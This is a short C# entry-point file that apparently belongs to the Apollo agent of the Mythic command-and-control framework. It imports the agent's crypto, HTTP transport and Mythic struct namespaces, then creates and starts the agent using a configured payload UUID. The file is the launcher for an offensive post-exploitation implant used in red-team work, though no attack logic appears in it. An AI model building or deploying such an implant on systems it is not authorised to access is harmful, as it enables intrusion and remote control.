using System;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;
using Apollo.Agent;

namespace Apollo
{
    class Program
    {
        static void Main(string[] args)
        {
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
            Console.WriteLine();
        }
    }
}
